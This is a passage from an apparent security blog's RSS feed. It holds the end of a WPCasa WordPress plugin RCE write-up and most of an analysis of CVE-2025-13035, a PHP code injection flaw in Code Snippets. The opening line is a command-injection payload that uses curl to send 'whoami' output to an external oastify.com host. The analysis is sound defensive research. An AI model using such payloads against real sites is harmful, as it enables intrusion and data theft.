/?wpsight-api=evil&amp;amp;cmd=curl&amp;#43;http://n9xe0s2jxjyt8klg2lxcj4b6jxpode13.oastify.com/?leaked=$(whoami) HTTP/1.1&#xA;Host: localhost&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-28-cve-2025-9321/result.png&#34; title=&#34;Output&#34; data-thumbnail=&#34;/posts/2025-11-28-cve-2025-9321/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Output&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-28-cve-2025-9321/result.png&#39; alt=&#34;Result&#34; height=&#34;600&#34; width=&#34;1138&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Output&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability results from unsafe handling of the &lt;code&gt;wpsight-api&lt;/code&gt; parameter, allowing arbitrary class instantiation and hook execution, leading to RCE. The patch adds strict input validation and endpoint restrictions to prevent exploitation.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;URL‑supplied data must be restricted using allow‑lists.&lt;/li&gt;&#xA;&lt;li&gt;Dynamic hooks and class instantiation must not rely on user input.&lt;/li&gt;&#xA;&lt;li&gt;Insufficient input validation can lead to critical RCE vulnerabilities.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wpcasa/vulnerability/wordpress-wpcasa-plugin-1-4-1-unauthenticated-code-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WPCasa Plugin &amp;lt;= 1.4.1 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-13035 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-27-cve-2025-13035/</link>
      <pubDate>Thu, 27 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-27-cve-2025-13035/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The WordPress Code Snippets plugin contains a PHP Code Injection vulnerability in all versions up to and including 3.9.1. The root cause is that the plugin uses &lt;code&gt;extract()&lt;/code&gt; on attacker-controlled shortcode attributes inside the &lt;code&gt;evaluate_shortcode_from_flat_file&lt;/code&gt; method, which can be used to overwrite the &lt;code&gt;$filepath&lt;/code&gt; variable and then pass it into &lt;code&gt;require_once&lt;/code&gt;. This allows an authenticated attacker with Contributor privileges or higher to execute arbitrary PHP code on the server via the &lt;code&gt;[code_snippet]&lt;/code&gt; shortcode by leveraging PHP filter chains if they can trick an administrator into enabling the &amp;ldquo;Enable file-based execution&amp;rdquo; option and creating at least one active Content snippet.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-13035&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-13035&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.9.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.9.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (8.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/code-snippets/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Code Snippets Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Code Snippets&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.9.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.9.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v3.9.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private function evaluate_shortcode_from_flat_file( $filepath, array $atts ): string {&#xA;    ob_start();&#xA;&#xA;    ( function( $atts ) use ( $filepath ) {&#xA;        /**&#xA;            * Avoiding extract is typically recommended, however in this situation we want to make it easy for snippet&#xA;            * authors to use custom attributes.&#xA;            *&#xA;            * @phpcs:disable WordPress.PHP.DontExtract.extract_extract&#xA;            */&#xA;        extract( $atts );&#xA;        require_once $filepath;&#xA;    } )( $atts );&#xA;&#xA;    return ob_get_clean();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In &lt;code&gt;evaluate_shortcode_from_flat_file&lt;/code&gt;, an &lt;strong&gt;anonymous function&lt;/strong&gt; is defined and immediately invoked (IIFE). It receives &lt;code&gt;$atts&lt;/code&gt; (the shortcode attributes array) and uses &lt;code&gt;$filepath&lt;/code&gt; from the outer scope via &lt;code&gt;use ($filepath)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;extract($atts)&lt;/code&gt; statement converts each element in the &lt;code&gt;$atts&lt;/code&gt; array into a separate variable in the current scope&amp;rsquo;s symbol table.&lt;/p&gt;&#xA;&lt;p&gt;Example:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$atts = [&amp;#39;color&amp;#39; =&amp;gt; &amp;#39;blue&amp;#39;, &amp;#39;size&amp;#39; =&amp;gt; &amp;#39;large&amp;#39;];&#xA;extract($atts);&#xA;// Now we have $color = &amp;#39;blue&amp;#39;, $size = &amp;#39;large&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Internally, PHP manages variables through &lt;strong&gt;zval containers&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition quote open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;A PHP variable is stored in a container called a &amp;ldquo;zval&amp;rdquo;. A zval container contains, besides the variable&amp;rsquo;s type and value, two additional bits of information. The first is called &amp;ldquo;is_ref&amp;rdquo; and is a boolean value indicating whether or not the variable is part of a &amp;ldquo;reference set&amp;rdquo;. With this bit, PHP&amp;rsquo;s engine knows how to differentiate between normal variables and references. Since PHP allows user-land references, as created by the &amp;amp; operator, a zval container also has an internal reference counting mechanism to optimize memory usage. This second piece of additional information, called &amp;ldquo;refcount&amp;rdquo;, contains how many variable names (also called symbols) point to this one zval container. All symbols are stored in a symbol table, of which there is one per scope. There is a scope for the main script (i.e., the one requested through the browser), as well as one for every function or method.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;When &lt;code&gt;extract()&lt;/code&gt; runs:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Each element in &lt;code&gt;$atts&lt;/code&gt; is mapped to a new variable.&lt;/li&gt;&#xA;&lt;li&gt;These variables point to the same &lt;strong&gt;zval&lt;/strong&gt; as the value in the array.&lt;/li&gt;&#xA;&lt;li&gt;This increases the &lt;strong&gt;refcount&lt;/strong&gt; (number of variable names referencing the same value).&lt;/li&gt;&#xA;&lt;li&gt;When the scope ends, the symbol table is destroyed, refcount decreases, and memory is freed.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;Variable name collision:&lt;/strong&gt;&#xA;If &lt;code&gt;$atts&lt;/code&gt; contains a key that matches an existing variable in the scope (e.g., &lt;code&gt;&amp;quot;filepath&amp;quot;&lt;/code&gt;), that variable will be overwritten.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$atts = [&amp;#39;filepath&amp;#39; =&amp;gt; &amp;#39;/tmp/malicious.php&amp;#39;];&#xA;extract($atts);&#xA;require_once $filepath; // now loads the file from $atts, not the original&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is the root cause of the vulnerability: an attacker can inject &lt;code&gt;&amp;quot;filepath&amp;quot;&lt;/code&gt; to control which file is &lt;code&gt;require_once&lt;/code&gt;.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Patch (v3.9.2):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/diff.png&#34; title=&#34;Patch changes&#34; data-thumbnail=&#34;/posts/2025-11-27-cve-2025-13035/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Patch changes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-27-cve-2025-13035/diff.png&#39; alt=&#34;Diff&#34; height=&#34;325&#34; width=&#34;1826&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch changes&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;In the patch, the &lt;code&gt;extract()&lt;/code&gt; call was added with the &lt;code&gt;EXTR_SKIP&lt;/code&gt; option.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;This ensures that if &lt;code&gt;$atts&lt;/code&gt; has a key matching an existing variable, the original variable is not overwritten.&lt;/li&gt;&#xA;&lt;li&gt;Thus, &lt;code&gt;$filepath&lt;/code&gt; from the outer scope remains safe, eliminating the risk of being replaced by &lt;code&gt;$atts&lt;/code&gt; data.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers a shortcode:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public const CONTENT_SHORTCODE = &amp;#39;code_snippet&amp;#39;;&#xA;add_shortcode( self::CONTENT_SHORTCODE, [ $this, &amp;#39;render_content_shortcode&amp;#39; ] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When this shortcode appears in post/page content, WordPress calls the &lt;code&gt;render_content_shortcode&lt;/code&gt; callback:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function render_content_shortcode( array $atts ): string {&#xA;    $atts = $this-&amp;gt;convert_boolean_attribute_flags( $atts, [ &amp;#39;network&amp;#39;, &amp;#39;php&amp;#39;, &amp;#39;format&amp;#39;, &amp;#39;shortcodes&amp;#39;, &amp;#39;debug&amp;#39; ] );&#xA;    $original_atts = $atts;&#xA;&#xA;    $atts = shortcode_atts(&#xA;        [&#xA;            &amp;#39;id&amp;#39;         =&amp;gt; 0,&#xA;            &amp;#39;snippet_id&amp;#39; =&amp;gt; 0,&#xA;            &amp;#39;network&amp;#39;    =&amp;gt; false,&#xA;            &amp;#39;php&amp;#39;        =&amp;gt; false,&#xA;            &amp;#39;format&amp;#39;     =&amp;gt; false,&#xA;            &amp;#39;shortcodes&amp;#39; =&amp;gt; false,&#xA;            &amp;#39;debug&amp;#39;      =&amp;gt; false,&#xA;        ],&#xA;        $atts,&#xA;        self::CONTENT_SHORTCODE&#xA;    );&#xA;&#xA;    $id = 0 !== intval( $atts[&amp;#39;snippet_id&amp;#39;] ) ? intval( $atts[&amp;#39;snippet_id&amp;#39;] ) : intval( $atts[&amp;#39;id&amp;#39;] );&#xA;    if ( ! $id ) {&#xA;        return $this-&amp;gt;invalid_id_warning( $id );&#xA;    }&#xA;&#xA;    $snippet = $this-&amp;gt;get_snippet( $id, (bool) $atts[&amp;#39;network&amp;#39;], &amp;#39;html&amp;#39; );&#xA;&#xA;    // Render the source code if this is not a shortcode snippet.&#xA;    if ( &amp;#39;content&amp;#39; !== $snippet-&amp;gt;scope ) {&#xA;        return $snippet-&amp;gt;id ? $this-&amp;gt;render_snippet_source( $snippet ) : $this-&amp;gt;invalid_id_warning( $snippet-&amp;gt;id );&#xA;    }&#xA;    ...&#xA;    $content = $this-&amp;gt;evaluate_shortcode_content( $snippet, $original_atts );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function creates a &lt;strong&gt;Snippet&lt;/strong&gt; object by calling &lt;code&gt;get_snippet&lt;/code&gt;, which accepts three parameters: the snippet ID, a boolean indicating whether network mode is used, and the desired format (&lt;strong&gt;html&lt;/strong&gt;). The result is a &lt;strong&gt;Snippet&lt;/strong&gt; object containing all necessary data for further processing.&lt;/p&gt;&#xA;&lt;p&gt;Next, it checks the snippet&amp;rsquo;s &lt;strong&gt;scope&lt;/strong&gt;. If the snippet is &lt;strong&gt;not&lt;/strong&gt; of type &lt;strong&gt;content&lt;/strong&gt; (&lt;code&gt;html&lt;/code&gt;)&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/content.png&#34; title=&#34;Content when creating Snippet&#34; data-thumbnail=&#34;/posts/2025-11-27-cve-2025-13035/content.png&#34; data-sub-html=&#34;&lt;h2&gt;Content&lt;/h2&gt;&lt;p&gt;Content when creating Snippet&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-27-cve-2025-13035/content.png&#39; alt=&#34;Content&#34; height=&#34;549&#34; width=&#34;1036&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Content when creating Snippet&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;the plugin does not process the content and instead returns the snippet&amp;rsquo;s source code.&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;evaluate_shortcode_content()&lt;/code&gt; function is called to process the shortcode content:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function evaluate_shortcode_content( Snippet $snippet, array $atts ): string {&#xA;    if ( empty( $atts[&amp;#39;php&amp;#39;] ) ) {&#xA;        return $snippet-&amp;gt;code;&#xA;    }&#xA;&#xA;    if ( ! Snippet_Files::is_active() ) {&#xA;        return $this-&amp;gt;evaluate_shortcode_from_db( $snippet, $atts );&#xA;    }&#xA;&#xA;    $network = DB::validate_network_param( $snippet-&amp;gt;network );&#xA;    $table_name = Snippet_Files::get_hashed_table_name( code_snippets()-&amp;gt;db-&amp;gt;get_table_name( $network ) );&#xA;    $filepath = $this-&amp;gt;build_snippet_flat_file_path( $table_name, $snippet );&#xA;&#xA;    return file_exists( $filepath )&#xA;        ? $this-&amp;gt;evaluate_shortcode_from_flat_file( $filepath, $atts )&#xA;        : $this-&amp;gt;evaluate_shortcode_from_db( $snippet, $atts );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It checks whether the &lt;code&gt;php&lt;/code&gt; attribute exists. If not, it returns the snippet&amp;rsquo;s original code without execution.&#xA;If &lt;code&gt;php&lt;/code&gt; exists but the storage file does not, it falls back to evaluating directly from the database.&lt;/p&gt;&#xA;&lt;p&gt;The storage file is declared:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private const ENABLED_FLAG_FILE = &amp;#39;flat-files-enabled.flag&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To prevent the function from returning early, the administrator must enable the &amp;ldquo;Enable file-based execution&amp;rdquo; option in the admin panel:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/enable.png&#34; title=&#34;Enable file-based execution&#34; data-thumbnail=&#34;/posts/2025-11-27-cve-2025-13035/enable.png&#34; data-sub-html=&#34;&lt;h2&gt;Enable&lt;/h2&gt;&lt;p&gt;Enable file-based execution&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-27-cve-2025-13035/enable.png&#39; alt=&#34;Enable&#34; height=&#34;810&#34; width=&#34;982&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Enable file-based execution&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This creates the storage file inside &lt;code&gt;wp-content/code-snippets&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/file.png&#34; title=&#34;flat-files-enabled.flag created&#34; data-thumbnail=&#34;/posts/2025-11-27-cve-2025-13035/file.png&#34; data-sub-html=&#34;&lt;h2&gt;File&lt;/h2&gt;&lt;p&gt;flat-files-enabled.flag created&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; 